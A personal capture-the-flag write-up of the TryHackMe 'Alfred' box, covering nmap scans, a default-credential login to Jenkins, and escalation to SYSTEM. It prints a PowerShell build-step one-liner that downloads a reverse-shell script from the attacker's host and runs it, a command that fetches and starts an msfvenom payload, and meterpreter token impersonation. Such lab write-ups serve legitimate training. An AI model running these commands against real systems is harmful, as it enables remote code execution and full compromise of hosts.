### THM Alfred

Welcome back.  So another box today.  This one looks to be a Jenkins box.

So, start off just like always, get our nmap going and see what we're looking at.

```
(kali@kali)-$ sudo nmap -T4 -p- -Pn 10.10.75.111     
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 10:09 EST
Nmap scan report for 10.10.75.111
Host is up (0.11s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 140.50 seconds
```

And our deeper look.  I know the first couple on this second step I didn't at the `-Pn` tag but this time it kicked back as not hearing me so I had to add it.  Should probably do that going forward.

```
(kali@kali)-$ sudo nmap -A -Pn -p 80,8080 10.10.75.111
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 10:16 EST
Nmap scan report for 10.10.75.111
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 7.5
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|8.1|Phone (90%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (87%), Microsoft Windows Server 2008 R2 (87%), Microsoft Windows Server 2008 R2 or Windows 8 (87%), Microsoft Windows 7 SP1 (87%), Microsoft Windows 8.1 Update 1 (87%), Microsoft Windows 8.1 R1 (87%), Microsoft Windows Phone 7.5 or 8.0 (87%), Microsoft Windows Embedded Standard 7 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   43.65 ms  10.6.0.1
2   ... 3
4   122.79 ms 10.10.75.111

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.82 seconds
```

Not even going to worry about the 3389 for the moment.  Check the websites and we get a Bruce Wayne memorial page and then on 8080, we get a Jenkins log in screen.  Thought about this one a little too hard at first, looked at the page source, tried checking for Jenkins exploits but then had a lightbulb moment and decided to try the username:password of admin:admin.  And wouldn't ya know it....

![Jeves Admin Dashboard](/Images/THM1Alfred/pic1.png)

After a bit more poking around, I realize, I've seen this before.  On the Jeeves box.  Ha, now, grabbing the user flag is ezpz.

![Reverse Shell Script](/Images/THM1Alfred/pic2.png)

Get my listener going, run the script and viola.

![User flag](/Images/THM1Alfred/pic3.png)

If you're doing the HTB route, and I am cause I ended up getting kinda stuck here on the escalation, going to go that route talks about powershell being the preferred method.

So following those directions, we poke a bit more around the Jenkins interface.  And going through we do find a place where we can kick off some powershell stuff.

`Project` in the middle area and then `configure` loads up an interface.  Going down to the Build section gives me a spot where I can put some commands in.

![Build](/Images/THM1Alfred/pic4.png)

`powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port`

Put that command in and we use that to get our shell going.

We'll need to first get Invoke-PowerShellTcp.ps1 via a google search and github.  Once we do that, start up the http server via python (`python3 -m http.server 80`), get the nc listener going on the port selected, and then in Jenkins click save and then build now.

That should download the invoke power shell file and kick us back into the user we had before.  But this time, we have a powershell instead of just a limited cmd prompt.

And we're here again.

![Bruce again](/Images/THM1Alfred/pic5.png)

Now that we're here, we need to elevate.  Checking the `whoami /priv` Gives us the following

![whoami /priv](/Images/THM1Alfred/pic6.png)

I can impersonate!  Woot woot!  Hot potato, let's fkin go!!

So we need to get a meterpreter session going.  So we use msfvenom in order to craft our exploit and get our meterpreter session going.

![msfvenom](/Images/THM1Alfred/pic7.png)

Fireup our meterpreter listener...

![handler options](/Images/THM1Alfred/pic8.png)

Make sure that your payload matches from your `msfvenom` or, guess what.  It won't work.  Nevermind how I know that or how frustrating it was figuring that out lol.  Anywho, back to it.

Once that's running, back to our powershell instance.  We use the following commands to get our meterpreter going.

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.x.x.x:80/alfred.exe','alfred.exe')"`
`Start-Process alfred.exe`

In our Metasploit console we get...

![meterpreter session](/Images/THM1Alfred/pic9.png)

```
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT SERVICE\AudioEndpointBuilder
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\PcaSvc
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```

We find that we can, in fact, impersonate the Builtin\Administrators token.

And so we do that and we are now NT AUTHORITY\SYSTEM!!

If you're following back on THM, go to the filepath listed and grab the root.txt from the System32\config folder with meterpreter's `download` command.

This one was a bit of a pain but it was my own fault.  I left the payload as default and because of such I was getting sessions but they would close immediately.  After I figured that out, it was pretty smooth sailing.  Need to make sure I'm staying on top of that.

Anywho, thank you again for riding along.
